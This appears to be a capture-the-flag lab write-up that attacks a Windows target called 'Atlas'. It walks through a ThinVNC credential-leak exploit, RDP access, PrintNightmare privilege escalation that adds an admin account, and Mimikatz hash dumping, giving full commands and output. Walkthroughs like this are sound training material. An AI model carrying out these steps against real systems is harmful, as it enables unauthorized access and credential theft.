# Atlas v1.4

## Enumeration

### NMAP Scan 

Check for running services and open ports. I realized after I ran the following command that I didn't need the `-A`. I changed my mind half way through typing it and didn't remove the `-A`.
```bash 
nmap -p- -Pn -sC -sV -A -vv -oN nmap.scan IPaddr
```

__*Ports*__
* 3389 Windows RDP
* 8080 ThinVNC

## Exploits

Looking for vulnerabilities in `searchsploit` shows that ThinVNC is vulnerable. The vulnerability allows the collecting of user ID:password information. The room author, Muirland Oracle, says that the exploit as written doesn't quite work. He has a working version on his Github.com pages. 

### Access - ThinVNC Exploit
> by Muirland Oracle


https://github.com/MuirlandOracle/CVE-2019-17662

Clone the repository. Move into the new directory and make the script executable. It may already be executable, but if not just changethe permissions using: 
`chmod +x CVE-2019-17662.py`

Run the script:
`./CVE-2019-17662.py`

This gives an error in the form of the help menu. The script needs the target IP and port number. Adding those, the comand is: 
`./CVE-2019-17662.py IPaddr 8080`

[+] Credentials Found!
Username:	[REDACTED]
Password:	 [REDACTED]

Now we can log into the ThinVNC service on port 8080. ThinVNC's interface is not the best. Since we now have credentials, let's move into the Windows native RDP for a better interactive interface. We will use `xfreerdp`. The syntax is: 
```bash
xfreerdp /v:IPaddr /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

There's a bunch of stuff going on here, so let's break each switch down:

-   `/v:IPaddr` -- this is where we specify what we want to connect to.
-   `/u:USERNAME /p:PASSWORD` -- here we would substitute in a valid username/password combination.
-   `/cert:ignore` -- RDP connections are encrypted. If our attacking machine doesn't recognise the certificate presented by the machine we are connecting to it will warn us and ask if we wish to proceed; this switch simply ignores that warning automatically.
-   `+clipboard` -- this shares our clipboard with the target, allowing us to copy and paste between our attacking machine and the target machine.
-   `/dynamic-resolution` lets us resize the GUI window, adjusting the resolution of our remote session automatically.
-   `/drive:share,/tmp` -- our final switch, this shares our own `/tmp` directory with the target. This is an _extremely_ useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!)

### Privilege Escalation

Windows exploitation is a massive topic which is complicated greatly by the common-place nature of various defence mechanisms -- Anti-Virus software being the most well-known of these. Exploiting an up-to-date Windows target with the default defences active is _far_ outwith the scope of this room, so we will assume that the Atlas server has had the defence mechanisms de-activated.

At this point we would usually start to enumerate the target to look for privilege escalation opportunities (or potentially lateral movement opportunities in an Active Directory environment). [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [Seatbelt](https://github.com/GhostPack/Seatbelt) are prime examples of tools that we may wish to employ here; however, there are many other tools available, and manual enumeration is always a wise idea.

That said, Windows enumeration can be daunting; there are hundreds of different vectors to consider. To keep this room simple, we will instead look at a set of exploits in the PrintSpooler service which are unpatched at the time of writing. PrintSpooler is notorious for privilege escalation vulnerabilities. It runs with the maximum available permissions (under the `NT AUTHORITY\SYSTEM` account) and is a popular target for vulnerability research. There have been many vulnerabilities found in this service in the past; however, one of the latest is referred to as "PrintNightmare".  

We will use PrintNightmare to elevate our privileges on this target.

### Privilege Escalation - PrintNightmare
> by Caleb Stewart and John Hammond

https://github.com/calebstewart/CVE-2021-1675

As before, we will clone the repository in our `/tmp` directory so it can be easily moved to the target machine. In the RDP seesion on the target machine, open a PowerShell window. Copy the PowerShell  (`.ps1`) script to the target. Import it with the command: 
`. \\tsclient\share\CVE-2021-1675.ps1`
The dot at the start is very important. Be certain you include it. 

I got a dialog that asked if I wanted to run the script. Selecting yes, didn't do anything. Now we start the exploit using the command: 
```powershell
PS C:\Users\Atlas> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

This creates a new administrator user `adm1n`with a password of `P@ssw0rd`. We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, the author provides a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.

The command is as follows:  
`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`

Execute this in your PowerShell session and follow the steps to spawn a new PowerShell process as an Administrator! Run the command `whoami /groups` in the new window. You should see `BUILTIN\Administrators` in the list of groups, and a line at the bottom of the output containing `Mandatory Label\High Mandatory Level`. These mean that you are running as an administrator with full access over the machine. Congratulations!


### Post Exploitation - Mimikatz

Awesome -- we have admin access! Now what do we do with it?

The classic thing to do here would be to try to dump the password hashes from the machine. In a network scenario these could come in handy for lateral movement. They also give us a way to prove our access to a client as Windows ([Serious Sam](https://www.rapid7.com/blog/post/2021/07/21/microsoft-sam-file-readability-cve-2021-36934-what-you-need-to-know/) vulnerability aside) prevents anyone from accessing this information if they don't have the highest possible privileges.

The most commonly used tool to dump password hashes on Windows is [Mimikatz](https://github.com/gentilkiwi/mimikatz) by the legendary [Benjamin Delpy](https://twitter.com/gentilkiwi/). The go-to tool for Windows post-exploitation: few tools are more iconic or more well-known than Mimikatz.

First up, let's get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download.

Go to the [releases page](https://github.com/gentilkiwi/mimikatz/releases) for Mimikatz and find the latest release at the top of the list. Download the file called `mimikatz_trunk.zip` to your attacking machine.

_**Note:** Certain browsers block the repository as being malicious. You're a hacker -- of course it's malicious. Just continue to the page anyway: it's perfectly safe._  

Make sure that the zip file is in your `/tmp` directory, then unzip it with `unzip mimikatz_trunk.zip`:
```bash
cd /tmp
mv ~/Downloads/mimikatz_trunk.zip .
unzip mimikatz_trunk.zip
```

Go back to the target computer. In RDP session use the elevated Command Shell to launch the exploit:
```bash
\\tsclient\share\mimikatz_trunk\x64\mimikatz.exe
```
If all goes well you get some nice ASCII art and a new mimikatz terminal prompt:
```bash
PS C:\Windows\system32> \\tsclient\share\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

When we start Mimikatz, we usually need to execute two commands before dumping the hashes:
* `privilege::debug` - this obtains debug privileges which allows us to access other processes for "debuging" purposes.
* `token::elevate` - simply put, this takes us from our administrative shell with high privileges into a `SYSTEM` level shell with maximum privileges. This is something that we have a *right* to do as an administrator, but that is not usually possible using normal Windows operations

There are several commands that can be used to dump the hashes. We will use: `lsadump::sam`. When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list:
```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

---

mimikatz # lsadump::sam
Domain : GAIA
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: [REDACTED]
```

## Conclusion
And there you have it. We're in. We've exploited some outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz. 
